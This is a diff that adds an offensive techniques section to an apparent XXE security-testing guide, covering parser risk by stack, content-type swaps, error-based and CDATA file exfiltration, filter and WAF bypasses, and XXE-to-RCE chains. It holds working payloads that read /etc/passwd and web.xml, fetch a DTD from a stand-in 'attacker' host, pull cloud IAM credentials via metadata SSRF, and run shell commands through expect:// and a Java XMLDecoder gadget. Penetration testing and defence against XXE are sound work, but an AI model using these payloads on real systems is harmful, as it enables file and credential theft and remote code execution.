@@ -218,3 +218,100 @@ Targets: transform endpoints, reporting engines (XSLT/Jasper/FOP), xml-styleshee
 ## Summary
 
 XXE is eliminated by hardening parsers: forbid DOCTYPE, disable external entity resolution, and disable network access for XML processors and transformers across every code path.
+
+
+## Additional Techniques — ported from WebSkills (xxe-test)
+
+### Parser default-risk by stack
+
+Whether XXE works depends entirely on the parser and its config. Triage accordingly:
+
+| Stack | Common parser(s) | Default risk |
+|-------|------------------|--------------|
+| Java | `DocumentBuilderFactory`, `SAXParser`, `XMLInputFactory`, `TransformerFactory`, JAXB | Historically vulnerable by default; XInclude/parameter entities often work |
+| PHP | `libxml` (`simplexml_load_*`, `DOMDocument`) | `libxml_disable_entity_loader` mattered pre-PHP 8; `php://filter`/`expect://` are PHP gadgets |
+| .NET | `XmlDocument`, `XmlReader`, `XmlTextReader` | Vulnerable when `DtdProcessing=Parse`/`ProhibitDtd=false` on older versions |
+| Python | `lxml`, `xml.etree`, `xml.sax` | `lxml` resolves entities/external DTDs by config; `defusedxml` is the fix |
+| Ruby | `Nokogiri`, REXML | `Nokogiri` needs `NOENT` to expand; usually safe-by-default — check |
+| Go | `encoding/xml` | Does NOT resolve external entities (generally XXE-safe) — note when triaging |
+
+### Highest-yield move: content-type swap to XML
+
+Take any JSON or form endpoint, switch `Content-Type` to `application/xml` (also try `text/xml`, `application/soap+xml`, `application/*+xml`) and send an equivalent XML body with an injected DOCTYPE. Many frameworks (Jackson XML, Spring, ASP.NET) will parse it even though the documented content-type was JSON:
+
+```http
+POST /api/user HTTP/1.1
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY cat "Tom"> ]>
+<user><name>&cat;</name></user>
+```
+Start with a benign reflected entity (`Tom`) to prove entity expansion before escalating.
+
+### Error-based XXE (no OOB channel)
+
+When there is no reflection and no outbound network, leak file contents inside a parser error. Host this as your external DTD:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+The parser tries to open `file:///nonexistent/<contents>` and echoes the failed path — including the file content — in its error message. Note: `&#x25;` is the hex ref for `%`, required so the inner entity is declared at parse time, not when the DTD is first read.
+
+### CDATA wrapper for multi-line / XML-breaking files
+
+Multi-line files or files containing `<`/`&` corrupt inline substitution. Wrap them in CDATA via an external DTD:
+
+Payload:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % file SYSTEM "file:///var/www/html/WEB-INF/web.xml">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "http://attacker:8000/wrapper.dtd">
+%dtd;
+]>
+```
+`wrapper.dtd`:
+```xml
+<!ENTITY wrapper "%start;%file;%end;">
+```
+(For PHP source, prefer `php://filter/read=convert.base64-encode/resource=...` — base64 is XML-safe.)
+
+### Filter-bypass catalogue (pick by what's blocked)
+
+- **`SYSTEM` blocked** → use `PUBLIC`: `<!ENTITY xxe PUBLIC "id" "file:///etc/passwd">`
+- **`ENTITY` keyword blocked** → case (`<!EnTiTy>`), or numeric/hex char refs for the letters: `<!&#69;&#78;&#84;&#73;&#84;&#89; xxe SYSTEM "...">`
+- **Keyword string filters** → split with a comment: `<!EN<!-- -->TITY ...>`
+- **URI inspected** → smuggle it as base64 via `data://`: `<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init;` (decodes to `file:///etc/passwd`)
+- **Byte-signature WAF** → change document `encoding=` to UTF-7 / UTF-16 / UTF-32 (with BOM); many upstream filters don't decode it but the parser does.
+
+Recommended order: PUBLIC-vs-SYSTEM → parameter entities → external-DTD chaining → mixed case → numeric/hex char refs → `data:`/base64 → UTF-7 → UTF-16/32 → comment-splitting → double encoding.
+
+### XXE → RCE chains
+
+| Path | Requirement | Trigger |
+|------|-------------|---------|
+| Log poisoning | Log readable via `file://` AND executed in a code context (usually needs an LFI include sink) | Inject `<?php ...?>` into a logged field, read+execute the log |
+| SSRF → creds | XXE→SSRF reaches AWS metadata / internal CI | Read `169.254.169.254/.../security-credentials/ROLE` → IAM creds → SSM/RunCommand |
+| Java deserialization | XML deserialized into objects (`XMLDecoder`, `XStream`) | See payload below |
+| PHP `expect://` | `expect` extension loaded | `<!ENTITY xxe SYSTEM "expect://id">` |
+| Shellshock | Vulnerable Bash reachable via CGI over XXE-driven SSRF | `() { :; };` payload in header to internal CGI |
+| OOB delivery | Confirmed outbound + a second-stage sink | External DTD returns a deserialization gadget |
+
+Java `XMLDecoder` RCE:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<java version="1.8" class="java.beans.XMLDecoder">
+  <object class="java.lang.ProcessBuilder">
+    <array class="java.lang.String" length="1">
+      <void index="0"><string>/bin/sh -c id</string></void>
+    </array>
+    <void method="start"/>
+  </object>
+</java>
+```
